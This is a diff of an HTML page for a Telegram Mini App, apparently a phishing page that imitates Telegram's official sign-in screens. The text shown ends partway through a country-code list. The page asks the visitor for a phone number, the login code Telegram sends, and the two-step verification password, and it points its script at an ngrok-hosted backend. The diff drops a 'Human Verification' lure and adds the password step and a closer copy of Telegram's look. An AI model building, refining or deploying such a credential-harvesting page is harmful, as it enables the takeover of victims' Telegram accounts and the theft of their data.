@@ -3,627 +3,431 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Human Verification</title>
+<title>Telegram</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
-<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600&display=swap" rel="stylesheet"/>
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-html, body { min-height: 100vh; font-family: 'DM Sans', sans-serif; }
-body { display: flex; align-items: center; justify-content: center; padding: 24px; }
-body.dark { background: radial-gradient(ellipse at 50% 0%, #1a3a2a 0%, #0d1f16 40%, #080f0c 100%); }
-body.tg-theme { background-color: var(--tg-theme-bg-color, #ffffff); color: var(--tg-theme-text-color, #000000); }
-.page { width: 100%; max-width: 360px; display: none; }
-.page.active { display: block; animation: fadeUp 0.4s ease both; }
-@keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-.card {
-background: linear-gradient(160deg, rgba(255,255,255,0.07) 0%, rgba(255,255,255,0.03) 100%);
-border: 1px solid rgba(255,255,255,0.08);
-border-radius: 24px; padding: 40px 32px 36px; text-align: center;
-backdrop-filter: blur(20px);
-box-shadow: 0 32px 80px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.1);
-}
-.icon-wrap {
-width: 64px; height: 64px;
-background: linear-gradient(145deg, #3ecf6e, #27a855);
-border-radius: 18px; display: flex; align-items: center; justify-content: center;
-margin: 0 auto 20px; box-shadow: 0 8px 24px rgba(62,207,110,0.35);
-}
-.icon-wrap svg { width: 32px; height: 32px; stroke: white; stroke-width: 2.5; fill: none; }
-.welcome { color: rgba(255,255,255,0.45); font-size: 14px; font-weight: 500; margin-bottom: 8px; }
-h1.green { color: #3ecf6e; font-size: 26px; font-weight: 700; letter-spacing: -0.5px; margin-bottom: 10px; }
-.subtitle { color: rgba(255,255,255,0.4); font-size: 14px; margin-bottom: 32px; }
-.btn-green {
-width: 100%; padding: 16px;
-background: linear-gradient(135deg, #3ecf6e, #27a855);
-color: white; font-family: 'DM Sans', sans-serif; font-size: 16px; font-weight: 600;
-border: none; border-radius: 14px; cursor: pointer;
-transition: transform 0.15s ease, box-shadow 0.15s ease;
-box-shadow: 0 8px 24px rgba(62,207,110,0.4);
-}
-.btn-green:hover { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(62,207,110,0.5); }
-.btn-green:active { transform: scale(0.98); }
-.btn-green:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-.signin-card { width: 100%; max-width: 340px; display: flex; flex-direction: column; align-items: center; }
-.logo {
-width: 100px; height: 100px; border-radius: 50%;
-background-color: var(--tg-theme-button-color, #2AABEE);
-display: flex; align-items: center; justify-content: center; margin-bottom: 1.5rem;
-}
-.signin-card h1 { font-size: 26px; font-weight: 700; color: var(--tg-theme-text-color, #000000); margin-bottom: 0.6rem; text-align: center; }
-.sub { font-size: 14px; color: var(--tg-theme-hint-color, #888888); text-align: center; line-height: 1.55; margin-bottom: 2rem; }
-.field { width: 100%; margin-bottom: 1.2rem; position: relative; }
-.field label {
-position: absolute; top: -8px; left: 10px; font-size: 12px;
-color: var(--tg-theme-hint-color, #888888);
-background-color: var(--tg-theme-bg-color, #ffffff);
-padding: 0 4px; line-height: 1; pointer-events: none; z-index: 1;
-}
-.country-display {
-width: 100%;
-border: 1px solid var(--tg-theme-hint-color, #cccccc);
-border-radius: 6px; padding: 13px 40px 13px 14px; font-size: 15px;
-font-family: 'DM Sans', sans-serif; color: var(--tg-theme-text-color, #000000);
-background-color: var(--tg-theme-secondary-bg-color, #f5f5f5);
-cursor: pointer; display: flex; align-items: center; gap: 10px; user-select: none;
-}
-.country-display .flag { font-size: 20px; line-height: 1; }
-.country-display .name { flex: 1; }
-.dropdown {
-display: none; position: absolute; top: calc(100% + 4px); left: 0; right: 0;
-background-color: var(--tg-theme-secondary-bg-color, #f5f5f5);
-border: 1px solid var(--tg-theme-hint-color, #cccccc);
-border-radius: 6px; max-height: 240px; overflow-y: auto; z-index: 100;
-box-shadow: 0 8px 24px rgba(0,0,0,0.15);
-}
-.dropdown.open { display: block; }
-.search-box {
-width: 100%; padding: 10px 14px; border: none;
-border-bottom: 1px solid var(--tg-theme-hint-color, #cccccc);
-background-color: var(--tg-theme-secondary-bg-color, #f5f5f5);
-color: var(--tg-theme-text-color, #000000);
-font-size: 14px; font-family: 'DM Sans', sans-serif; outline: none;
-position: sticky; top: 0; z-index: 1;
-}
-.search-box::placeholder { color: var(--tg-theme-hint-color, #aaaaaa); }
-.country-option {
-padding: 10px 14px; display: flex; align-items: center; gap: 10px;
-cursor: pointer; font-size: 14px; color: var(--tg-theme-text-color, #000000);
-transition: background 0.1s;
-}
-.country-option:hover { background-color: rgba(0,0,0,0.06); }
-.country-option .flag { font-size: 20px; }
-.country-option .opt-name { flex: 1; }
-.country-option .opt-code { color: var(--tg-theme-hint-color, #888888); font-size: 13px; }
-.field input {
-width: 100%; border: 1px solid var(--tg-theme-hint-color, #cccccc);
-border-radius: 6px; padding: 13px 14px; font-size: 15px;
-font-family: 'DM Sans', sans-serif; color: var(--tg-theme-text-color, #000000);
-background-color: var(--tg-theme-secondary-bg-color, #f5f5f5);
-outline: none; transition: border-color 0.15s;
-}
-.field input::placeholder { color: var(--tg-theme-hint-color, #aaaaaa); }
-.field input:focus { border-color: var(--tg-theme-button-color, #2AABEE); }
-.chevron {
-position: absolute; right: 12px; top: 18px;
-pointer-events: none; color: var(--tg-theme-hint-color, #888888); font-size: 18px;
-}
-.btn-tg {
-width: 100%; padding: 15px; border-radius: 8px; border: none;
-background-color: var(--tg-theme-button-color, #2AABEE);
-color: var(--tg-theme-button-text-color, #ffffff);
-font-size: 15px; font-weight: 700; font-family: 'DM Sans', sans-serif;
-letter-spacing: 0.06em; cursor: pointer; margin-top: 0.25rem;
-transition: opacity 0.15s, transform 0.1s;
-}
-.btn-tg:hover { opacity: 0.88; }
-.btn-tg:active { transform: scale(0.98); }
-.btn-tg:disabled { opacity: 0.6; cursor: not-allowed; }
-.qr {
-margin-top: 1.2rem; font-size: 13px; font-weight: 600;
-color: var(--tg-theme-link-color, #2AABEE);
-cursor: pointer; background: none; border: none; font-family: 'DM Sans', sans-serif;
-}
-.qr:hover { text-decoration: underline; }
-.success-icon {
-width: 80px; height: 80px;
-background: linear-gradient(145deg, #3ecf6e, #27a855);
-border-radius: 50%; display: flex; align-items: center; justify-content: center;
-margin: 0 auto 24px; box-shadow: 0 8px 32px rgba(62,207,110,0.4);
-}
-.success-icon svg { width: 40px; height: 40px; stroke: white; stroke-width: 2.5; fill: none; }
-.success-title { color: white; font-size: 22px; font-weight: 700; margin-bottom: 10px; }
-.success-sub { color: rgba(255,255,255,0.4); font-size: 14px; margin-bottom: 28px; }
+* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+html, body { height: 100%; font-family: 'Roboto', sans-serif; background: #fff; color: #000; }
+body { display: flex; align-items: center; justify-content: center; }
 
-/* ── Code entry page styles ── */
-.code-card { width: 100%; max-width: 340px; display: flex; flex-direction: column; align-items: center; }
-.code-card h1 { font-size: 24px; font-weight: 700; color: var(--tg-theme-text-color, #000000); margin-bottom: 0.5rem; text-align: center; }
-.code-hint { font-size: 13px; color: var(--tg-theme-hint-color, #888888); text-align: center; line-height: 1.5; margin-bottom: 2rem; }
-.code-hint span { color: var(--tg-theme-text-color, #000000); font-weight: 600; }
-.code-inputs { display: flex; gap: 10px; margin-bottom: 1.5rem; }
-.code-inputs input {
-width: 44px; height: 54px; text-align: center; font-size: 22px; font-weight: 700;
-font-family: 'DM Sans', sans-serif;
-border: 1.5px solid var(--tg-theme-hint-color, #cccccc);
-border-radius: 10px;
-color: var(--tg-theme-text-color, #000000);
-background-color: var(--tg-theme-secondary-bg-color, #f5f5f5);
-outline: none; transition: border-color 0.15s;
-caret-color: transparent;
-}
-.code-inputs input:focus { border-color: var(--tg-theme-button-color, #2AABEE); }
-.code-inputs input.filled { border-color: var(--tg-theme-button-color, #2AABEE); }
-.error-msg {
-font-size: 13px; color: #e74c3c; text-align: center;
-margin-bottom: 1rem; min-height: 20px;
-}
-.resend-btn {
-background: none; border: none; font-family: 'DM Sans', sans-serif;
-font-size: 13px; font-weight: 600; cursor: pointer; margin-top: 0.75rem;
-color: var(--tg-theme-link-color, #2AABEE);
-}
-.resend-btn:disabled { color: var(--tg-theme-hint-color, #aaaaaa); cursor: default; }
-.resend-btn:not(:disabled):hover { text-decoration: underline; }
+.page { width: 100%; max-width: 400px; padding: 24px 24px 40px; display: none; flex-direction: column; align-items: center; }
+.page.active { display: flex; }
+
+.tg-logo { width: 96px; height: 96px; border-radius: 50%; background: linear-gradient(180deg, #4fabf7 0%, #2AABEE 100%); display: flex; align-items: center; justify-content: center; margin-bottom: 24px; box-shadow: 0 4px 24px rgba(42,171,238,0.3); }
+.tg-logo svg { width: 52px; height: 52px; }
+
+h1 { font-size: 24px; font-weight: 600; color: #000; margin-bottom: 12px; text-align: center; }
+.desc { font-size: 14px; color: #707579; text-align: center; line-height: 1.6; margin-bottom: 32px; max-width: 280px; }
+
+.phone-row { display: flex; width: 100%; gap: 0; margin-bottom: 8px; border-bottom: 2px solid #2AABEE; }
+.country-btn { display: flex; align-items: center; gap: 6px; padding: 10px 10px 10px 0; font-size: 16px; color: #000; background: none; border: none; cursor: pointer; white-space: nowrap; font-family: 'Roboto', sans-serif; font-weight: 400; min-width: 80px; }
+.country-btn .flag { font-size: 20px; }
+.country-btn .dial { color: #000; font-size: 16px; }
+.divider-v { width: 1px; background: #c4c9cc; margin: 8px 10px 8px 4px; }
+.phone-input { flex: 1; border: none; outline: none; font-size: 16px; font-family: 'Roboto', sans-serif; color: #000; padding: 10px 0; background: transparent; }
+.phone-input::placeholder { color: #a8a8a8; }
+
+.field-label { width: 100%; font-size: 13px; color: #2AABEE; margin-bottom: 24px; }
+
+.btn-primary { width: 100%; padding: 14px; border-radius: 8px; border: none; background: #2AABEE; color: #fff; font-size: 15px; font-weight: 500; font-family: 'Roboto', sans-serif; cursor: pointer; transition: background 0.15s, transform 0.1s; letter-spacing: 0.02em; }
+.btn-primary:hover { background: #25a0e0; }
+.btn-primary:active { transform: scale(0.98); }
+.btn-primary:disabled { background: #b3d9f5; cursor: not-allowed; transform: none; }
+
+.country-picker { position: fixed; inset: 0; background: #fff; z-index: 100; display: none; flex-direction: column; }
+.country-picker.open { display: flex; }
+.picker-header { display: flex; align-items: center; padding: 12px 16px; border-bottom: 1px solid #e4e4e4; gap: 12px; }
+.picker-back { background: none; border: none; cursor: pointer; color: #2AABEE; font-size: 15px; font-family: 'Roboto', sans-serif; padding: 4px 0; }
+.picker-title { font-size: 18px; font-weight: 600; flex: 1; }
+.picker-search { width: 100%; padding: 10px 16px; border: none; border-bottom: 1px solid #e4e4e4; font-size: 15px; font-family: 'Roboto', sans-serif; outline: none; color: #000; }
+.picker-search::placeholder { color: #a8a8a8; }
+.picker-list { flex: 1; overflow-y: auto; }
+.picker-item { display: flex; align-items: center; padding: 12px 16px; gap: 14px; cursor: pointer; transition: background 0.1s; border-bottom: 1px solid #f0f0f0; }
+.picker-item:hover { background: #f5f5f5; }
+.picker-item .flag { font-size: 22px; }
+.picker-item .country-name { flex: 1; font-size: 15px; color: #000; }
+.picker-item .country-code { font-size: 14px; color: #707579; }
+
+.code-desc { font-size: 14px; color: #707579; text-align: center; line-height: 1.6; margin-bottom: 28px; max-width: 280px; }
+.code-desc strong { color: #000; font-weight: 500; }
+.code-boxes { display: flex; gap: 10px; margin-bottom: 8px; }
+.code-boxes input { width: 42px; height: 52px; text-align: center; font-size: 22px; font-weight: 500; font-family: 'Roboto', sans-serif; border: none; border-bottom: 2px solid #c4c9cc; outline: none; color: #000; background: transparent; transition: border-color 0.15s; caret-color: #2AABEE; }
+.code-boxes input:focus { border-color: #2AABEE; }
+.code-boxes input.filled { border-color: #2AABEE; }
+.error-text { font-size: 13px; color: #e53935; text-align: center; min-height: 20px; margin-bottom: 20px; width: 100%; }
+.resend { background: none; border: none; font-family: 'Roboto', sans-serif; font-size: 14px; color: #2AABEE; cursor: pointer; margin-top: 16px; }
+.resend:disabled { color: #a8a8a8; cursor: default; }
+.resend:not(:disabled):hover { text-decoration: underline; }
+.back-link { font-size: 14px; color: #2AABEE; cursor: pointer; margin-top: 12px; background: none; border: none; font-family: 'Roboto', sans-serif; }
+.back-link:hover { text-decoration: underline; }
+
+.tfa-input-wrap { width: 100%; border-bottom: 2px solid #2AABEE; margin-bottom: 8px; }
+.tfa-input { width: 100%; border: none; outline: none; font-size: 16px; font-family: 'Roboto', sans-serif; color: #000; padding: 10px 0; background: transparent; }
+.tfa-input::placeholder { color: #a8a8a8; }
+
+.success-icon { width: 96px; height: 96px; border-radius: 50%; background: linear-gradient(180deg, #69db7c 0%, #40c057 100%); display: flex; align-items: center; justify-content: center; margin-bottom: 24px; box-shadow: 0 4px 24px rgba(64,192,87,0.3); }
+.success-icon svg { width: 48px; height: 48px; stroke: white; stroke-width: 2.5; fill: none; }
 </style>
 </head>
-<body class="dark">
+<body>
 
-<!-- ── Page 1: Welcome ── -->
+<!-- Page 1: Phone entry -->
 <div class="page active" id="page1">
-  <div class="card">
-    <div class="icon-wrap">
-      <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
-    </div>
-    <p class="welcome">Welcome, <span id="username1">there</span></p>
-    <h1 class="green">Human Verification</h1>
-    <p class="subtitle">Verify below to be granted entry</p>
-    <button class="btn-green" onclick="goToSignIn()">Click here to verify</button>
+  <div class="tg-logo">
+    <svg viewBox="0 0 48 48" fill="none">
+      <path d="M20 30.5L20.5 38.5C21.3 38.5 21.6 38.2 22 37.8L26 34L34.5 40C36 40.9 37.1 40.4 37.4 38.6L42.5 9.8C42.9 7.6 41.5 6.7 40 7.3L5.5 21C3.3 21.9 3.3 23.1 5.1 23.7L14.1 26.5L35.2 13.2C36.2 12.6 37 12.9 36.3 13.6L20 30.5Z" fill="white"/>
+    </svg>
   </div>
+  <h1>Sign in to Telegram</h1>
+  <p class="desc">Please confirm your country code and enter your phone number.</p>
+  <div class="phone-row">
+    <button class="country-btn" id="countryBtn" onclick="openPicker()">
+      <span class="flag" id="selFlag">🇺🇸</span>
+      <span class="dial" id="selDial">+1</span>
+      <svg width="12" height="8" viewBox="0 0 12 8" fill="none" style="margin-left:2px"><path d="M1 1L6 6L11 1" stroke="#707579" stroke-width="1.5" stroke-linecap="round"/></svg>
+    </button>
+    <div class="divider-v"></div>
+    <input class="phone-input" id="phoneInput" type="tel" placeholder="Phone Number" inputmode="tel" />
+  </div>
+  <div class="field-label">Phone Number</div>
+  <button class="btn-primary" id="nextBtn" onclick="handleSendCode()">NEXT</button>
 </div>
 
-<!-- ── Page 2: Phone number entry ── -->
+<!-- Page 2: Code entry -->
 <div class="page" id="page2">
-  <div class="signin-card">
-    <div class="logo">
-      <svg width="54" height="54" viewBox="0 0 54 54" fill="none">
-        <path d="M22.5 34.5L23.1 42.9C24 42.9 24.4 42.5 24.9 42L29.4 37.7L38.7 44.5C40.4 45.5 41.6 44.9 42 42.9L48 10.4C48.5 7.9 47 6.9 45.3 7.6L6 23C3.6 24 3.6 25.4 5.6 26L15.5 29.1L39.5 14.3C40.6 13.6 41.6 14 40.8 14.8L22.5 34.5Z" fill="white"/>
-      </svg>
-    </div>
-    <h1>Sign in to Telegram</h1>
-    <p class="sub">Please confirm your country code<br>and enter your phone number.</p>
-    <div class="field">
-      <label>Country</label>
-      <div class="country-display" id="countryDisplay" onclick="toggleDropdown()" tabindex="0">
-        <span class="flag" id="selectedFlag">🇺🇸</span>
-        <span class="name" id="selectedName">United States (+1)</span>
-      </div>
-      <span class="chevron">&#8964;</span>
-      <div class="dropdown" id="countryDropdown">
-        <input class="search-box" type="text" placeholder="Search country..." oninput="filterCountries(this.value)" />
-        <div id="countryList"></div>
-      </div>
-    </div>
-    <div class="field">
-      <label>Phone Number</label>
-      <input type="tel" id="phoneInput" placeholder="+1" />
-    </div>
-    <button class="btn-tg" id="nextBtn" onclick="handleSendCode()">NEXT</button>
-    <button class="qr">LOG IN BY QR CODE</button>
+  <div class="tg-logo">
+    <svg viewBox="0 0 48 48" fill="none">
+      <path d="M20 30.5L20.5 38.5C21.3 38.5 21.6 38.2 22 37.8L26 34L34.5 40C36 40.9 37.1 40.4 37.4 38.6L42.5 9.8C42.9 7.6 41.5 6.7 40 7.3L5.5 21C3.3 21.9 3.3 23.1 5.1 23.7L14.1 26.5L35.2 13.2C36.2 12.6 37 12.9 36.3 13.6L20 30.5Z" fill="white"/>
+    </svg>
   </div>
+  <h1 id="codeTitle">+1 000 0000</h1>
+  <p class="code-desc">We have sent you a message with the code to your <strong>Telegram</strong> account.</p>
+  <div class="code-boxes" id="codeBoxes">
+    <input type="tel" maxlength="1" inputmode="numeric"/>
+    <input type="tel" maxlength="1" inputmode="numeric"/>
+    <input type="tel" maxlength="1" inputmode="numeric"/>
+    <input type="tel" maxlength="1" inputmode="numeric"/>
+    <input type="tel" maxlength="1" inputmode="numeric"/>
+  </div>
+  <div class="error-text" id="codeError"></div>
+  <button class="btn-primary" id="verifyBtn" onclick="handleVerifyCode()" disabled>NEXT</button>
+  <button class="resend" id="resendBtn" disabled onclick="handleResend()">Resend code</button>
+  <button class="back-link" onclick="showPage('page1')">Change number</button>
 </div>
 
-<!-- ── Page 2.5: Code entry ── -->
-<div class="page" id="page25">
-  <div class="code-card">
-    <div class="logo">
-      <svg width="54" height="54" viewBox="0 0 54 54" fill="none">
-        <path d="M22.5 34.5L23.1 42.9C24 42.9 24.4 42.5 24.9 42L29.4 37.7L38.7 44.5C40.4 45.5 41.6 44.9 42 42.9L48 10.4C48.5 7.9 47 6.9 45.3 7.6L6 23C3.6 24 3.6 25.4 5.6 26L15.5 29.1L39.5 14.3C40.6 13.6 41.6 14 40.8 14.8L22.5 34.5Z" fill="white"/>
-      </svg>
-    </div>
-    <h1>Enter the code</h1>
-    <p class="code-hint">We sent a code to your Telegram account<br><span id="phoneDisplay"></span></p>
-    <div class="code-inputs" id="codeInputs">
-      <input type="tel" maxlength="1" />
-      <input type="tel" maxlength="1" />
-      <input type="tel" maxlength="1" />
-      <input type="tel" maxlength="1" />
-      <input type="tel" maxlength="1" />
-      <input type="tel" maxlength="1" />
-    </div>
-    <div class="error-msg" id="codeError"></div>
-    <button class="btn-tg" id="verifyBtn" onclick="handleVerifyCode()" disabled>VERIFY</button>
-    <button class="resend-btn" id="resendBtn" onclick="handleResend()" disabled></button>
+<!-- Page 2FA -->
+<div class="page" id="page2fa">
+  <div class="tg-logo">
+    <svg viewBox="0 0 48 48" fill="none">
+      <path d="M20 30.5L20.5 38.5C21.3 38.5 21.6 38.2 22 37.8L26 34L34.5 40C36 40.9 37.1 40.4 37.4 38.6L42.5 9.8C42.9 7.6 41.5 6.7 40 7.3L5.5 21C3.3 21.9 3.3 23.1 5.1 23.7L14.1 26.5L35.2 13.2C36.2 12.6 37 12.9 36.3 13.6L20 30.5Z" fill="white"/>
+    </svg>
   </div>
+  <h1>Two-step verification</h1>
+  <p class="desc">Your account is protected with an additional password.</p>
+  <div class="tfa-input-wrap">
+    <input class="tfa-input" id="tfaInput" type="password" placeholder="Password" />
+  </div>
+  <div class="field-label">Password</div>
+  <div class="error-text" id="tfaError"></div>
+  <button class="btn-primary" id="tfaBtn" onclick="handleTfa()">NEXT</button>
+  <button class="back-link" onclick="showPage('page2')">Back</button>
 </div>
 
-<!-- ── Page 3: Success ── -->
+<!-- Page 3: Success -->
 <div class="page" id="page3">
-  <div class="card" style="text-align:center;">
-    <div class="success-icon">
-      <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
-    </div>
-    <div class="success-title">You're Verified!</div>
-    <p class="success-sub">You have been granted entry. You may now close this window.</p>
-    <button class="btn-green" onclick="window.Telegram?.WebApp?.close()">Close</button>
+  <div class="success-icon">
+    <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
   </div>
+  <h1>You're in!</h1>
+  <p class="desc">You have been successfully verified. You may now close this window.</p>
+  <button class="btn-primary" onclick="window.Telegram?.WebApp?.close()">Close</button>
+</div>
+
+<!-- Country picker -->
+<div class="country-picker" id="countryPicker">
+  <div class="picker-header">
+    <button class="picker-back" onclick="closePicker()">← Back</button>
+    <span class="picker-title">Choose a country</span>
+  </div>
+  <input class="picker-search" type="text" placeholder="Search" oninput="filterCountries(this.value)" />
+  <div class="picker-list" id="pickerList"></div>
 </div>
 
 <script>
-// ── CONFIG — replace with your real backend URL ──
 const API_BASE = 'https://silt-stoop-canning.ngrok-free.dev';
 
 const tg = window.Telegram?.WebApp;
-if (tg) {
-  tg.ready(); tg.expand();
-  function syncTheme() {
-    const bg = tg.themeParams.bg_color || '#ffffff';
-    tg.setBackgroundColor(bg);
-    tg.setHeaderColor(bg);
-  }
-  syncTheme();
-  tg.onEvent('themeChanged', syncTheme);
-}
+if (tg) { tg.ready(); tg.expand(); }
 
-// ── Country data ──
 const countries = [
-  {flag:"🔢",name:"Anonymous Number",code:"+888"},
-  {flag:"🇦🇫",name:"Afghanistan",code:"+93"},
-  {flag:"🇦🇱",name:"Albania",code:"+355"},
-  {flag:"🇩🇿",name:"Algeria",code:"+213"},
-  {flag:"🇦🇸",name:"American Samoa",code:"+1684"},
-  {flag:"🇦🇩",name:"Andorra",code:"+376"},
-  {flag:"🇦🇴",name:"Angola",code:"+244"},
-  {flag:"🇦🇮",name:"Anguilla",code:"+1264"},
-  {flag:"🇦🇬",name:"Antigua & Barbuda",code:"+1268"},
-  {flag:"🇦🇷",name:"Argentina",code:"+54"},
-  {flag:"🇦🇲",name:"Armenia",code:"+374"},
-  {flag:"🇦🇼",name:"Aruba",code:"+297"},
-  {flag:"🇦🇺",name:"Australia",code:"+61"},
-  {flag:"🇦🇹",name:"Austria",code:"+43"},
-  {flag:"🇦🇿",name:"Azerbaijan",code:"+994"},
-  {flag:"🇧🇸",name:"Bahamas",code:"+1242"},
-  {flag:"🇧🇭",name:"Bahrain",code:"+973"},
-  {flag:"🇧🇩",name:"Bangladesh",code:"+880"},
-  {flag:"🇧🇧",name:"Barbados",code:"+1246"},
-  {flag:"🇧🇾",name:"Belarus",code:"+375"},
-  {flag:"🇧🇪",name:"Belgium",code:"+32"},
-  {flag:"🇧🇿",name:"Belize",code:"+501"},
-  {flag:"🇧🇯",name:"Benin",code:"+229"},
-  {flag:"🇧🇲",name:"Bermuda",code:"+1441"},
-  {flag:"🇧🇹",name:"Bhutan",code:"+975"},
-  {flag:"🇧🇴",name:"Bolivia",code:"+591"},
-  {flag:"🇧🇦",name:"Bosnia & Herzegovina",code:"+387"},
-  {flag:"🇧🇼",name:"Botswana",code:"+267"},
-  {flag:"🇧🇷",name:"Brazil",code:"+55"},
-  {flag:"🇮🇴",name:"British Indian Ocean Territory",code:"+246"},
-  {flag:"🇻🇬",name:"British Virgin Islands",code:"+1284"},
-  {flag:"🇧🇳",name:"Brunei",code:"+673"},
-  {flag:"🇧🇬",name:"Bulgaria",code:"+359"},
-  {flag:"🇧🇫",name:"Burkina Faso",code:"+226"},
-  {flag:"🇧🇮",name:"Burundi",code:"+257"},
-  {flag:"🇰🇭",name:"Cambodia",code:"+855"},
-  {flag:"🇨🇲",name:"Cameroon",code:"+237"},
-  {flag:"🇨🇦",name:"Canada",code:"+1"},
-  {flag:"🇨🇻",name:"Cape Verde",code:"+238"},
-  {flag:"🇰🇾",name:"Cayman Islands",code:"+1345"},
-  {flag:"🇨🇫",name:"Central African Republic",code:"+236"},
-  {flag:"🇹🇩",name:"Chad",code:"+235"},
-  {flag:"🇨🇱",name:"Chile",code:"+56"},
-  {flag:"🇨🇳",name:"China",code:"+86"},
-  {flag:"🇨🇴",name:"Colombia",code:"+57"},
-  {flag:"🇰🇲",name:"Comoros",code:"+269"},
-  {flag:"🇨🇬",name:"Congo",code:"+242"},
-  {flag:"🇨🇩",name:"Congo (DRC)",code:"+243"},
-  {flag:"🇨🇰",name:"Cook Islands",code:"+682"},
-  {flag:"🇨🇷",name:"Costa Rica",code:"+506"},
-  {flag:"🇭🇷",name:"Croatia",code:"+385"},
-  {flag:"🇨🇺",name:"Cuba",code:"+53"},
-  {flag:"🇨🇾",name:"Cyprus",code:"+357"},
-  {flag:"🇨🇿",name:"Czech Republic",code:"+420"},
-  {flag:"🇩🇰",name:"Denmark",code:"+45"},
-  {flag:"🇩🇯",name:"Djibouti",code:"+253"},
-  {flag:"🇩🇲",name:"Dominica",code:"+1767"},
-  {flag:"🇩🇴",name:"Dominican Republic",code:"+1809"},
-  {flag:"🇹🇱",name:"East Timor",code:"+670"},
-  {flag:"🇪🇨",name:"Ecuador",code:"+593"},
-  {flag:"🇪🇬",name:"Egypt",code:"+20"},
-  {flag:"🇸🇻",name:"El Salvador",code:"+503"},
-  {flag:"🇬🇶",name:"Equatorial Guinea",code:"+240"},
-  {flag:"🇪🇷",name:"Eritrea",code:"+291"},
-  {flag:"🇪🇪",name:"Estonia",code:"+372"},
-  {flag:"🇪🇹",name:"Ethiopia",code:"+251"},
-  {flag:"🇫🇰",name:"Falkland Islands",code:"+500"},
-  {flag:"🇫🇴",name:"Faroe Islands",code:"+298"},
-  {flag:"🇫🇯",name:"Fiji",code:"+679"},
-  {flag:"🇫🇮",name:"Finland",code:"+358"},
-  {flag:"🇫🇷",name:"France",code:"+33"},
-  {flag:"🇬🇫",name:"French Guiana",code:"+594"},
-  {flag:"🇵🇫",name:"French Polynesia",code:"+689"},
-  {flag:"🇬🇦",name:"Gabon",code:"+241"},
-  {flag:"🇬🇲",name:"Gambia",code:"+220"},
-  {flag:"🇬🇪",name:"Georgia",code:"+995"},
-  {flag:"🇩🇪",name:"Germany",code:"+49"},
-  {flag:"🇬🇭",name:"Ghana",code:"+233"},
-  {flag:"🇬🇮",name:"Gibraltar",code:"+350"},
-  {flag:"🇬🇷",name:"Greece",code:"+30"},
-  {flag:"🇬🇱",name:"Greenland",code:"+299"},
-  {flag:"🇬🇩",name:"Grenada",code:"+1473"},
-  {flag:"🇬🇵",name:"Guadeloupe",code:"+590"},
-  {flag:"🇬🇺",name:"Guam",code:"+1671"},
-  {flag:"🇬🇹",name:"Guatemala",code:"+502"},
-  {flag:"🇬🇳",name:"Guinea",code:"+224"},
-  {flag:"🇬🇼",name:"Guinea-Bissau",code:"+245"},
-  {flag:"🇬🇾",name:"Guyana",code:"+592"},
-  {flag:"🇭🇹",name:"Haiti",code:"+509"},
-  {flag:"🇭🇳",name:"Honduras",code:"+504"},
-  {flag:"🇭🇰",name:"Hong Kong",code:"+852"},
-  {flag:"🇭🇺",name:"Hungary",code:"+36"},
-  {flag:"🇮🇸",name:"Iceland",code:"+354"},
-  {flag:"🇮🇳",name:"India",code:"+91"},
-  {flag:"🇮🇩",name:"Indonesia",code:"+62"},
-  {flag:"🇮🇷",name:"Iran",code:"+98"},
-  {flag:"🇮🇶",name:"Iraq",code:"+964"},
-  {flag:"🇮🇪",name:"Ireland",code:"+353"},
-  {flag:"🇮🇱",name:"Israel",code:"+972"},
-  {flag:"🇮🇹",name:"Italy",code:"+39"},
-  {flag:"🇨🇮",name:"Ivory Coast",code:"+225"},
-  {flag:"🇯🇲",name:"Jamaica",code:"+1876"},
-  {flag:"🇯🇵",name:"Japan",code:"+81"},
-  {flag:"🇯🇴",name:"Jordan",code:"+962"},
-  {flag:"🇰🇿",name:"Kazakhstan",code:"+7"},
-  {flag:"🇰🇪",name:"Kenya",code:"+254"},
-  {flag:"🇰🇮",name:"Kiribati",code:"+686"},
-  {flag:"🇽🇰",name:"Kosovo",code:"+383"},
-  {flag:"🇰🇼",name:"Kuwait",code:"+965"},
-  {flag:"🇰🇬",name:"Kyrgyzstan",code:"+996"},
-  {flag:"🇱🇦",name:"Laos",code:"+856"},
-  {flag:"🇱🇻",name:"Latvia",code:"+371"},
-  {flag:"🇱🇧",name:"Lebanon",code:"+961"},
-  {flag:"🇱🇸",name:"Lesotho",code:"+266"},
-  {flag:"🇱🇷",name:"Liberia",code:"+231"},
-  {flag:"🇱🇾",name:"Libya",code:"+218"},
-  {flag:"🇱🇮",name:"Liechtenstein",code:"+423"},
-  {flag:"🇱🇹",name:"Lithuania",code:"+370"},
-  {flag:"🇱🇺",name:"Luxembourg",code:"+352"},
-  {flag:"🇲🇴",name:"Macau",code:"+853"},
-  {flag:"🇲🇰",name:"Macedonia",code:"+389"},
-  {flag:"🇲🇬",name:"Madagascar",code:"+261"},
-  {flag:"🇲🇼",name:"Malawi",code:"+265"},
-  {flag:"🇲🇾",name:"Malaysia",code:"+60"},
-  {flag:"🇲🇻",name:"Maldives",code:"+960"},
-  {flag:"🇲🇱",name:"Mali",code:"+223"},
-  {flag:"🇲🇹",name:"Malta",code:"+356"},
-  {flag:"🇲🇭",name:"Marshall Islands",code:"+692"},
-  {flag:"🇲🇶",name:"Martinique",code:"+596"},
-  {flag:"🇲🇷",name:"Mauritania",code:"+222"},
-  {flag:"🇲🇺",name:"Mauritius",code:"+230"},
-  {flag:"🇾🇹",name:"Mayotte",code:"+262"},
-  {flag:"🇲🇽",name:"Mexico",code:"+52"},
-  {flag:"🇫🇲",name:"Micronesia",code:"+691"},
-  {flag:"🇲🇩",name:"Moldova",code:"+373"},
-  {flag:"🇲🇨",name:"Monaco",code:"+377"},
-  {flag:"🇲🇳",name:"Mongolia",code:"+976"},
-  {flag:"🇲🇪",name:"Montenegro",code:"+382"},
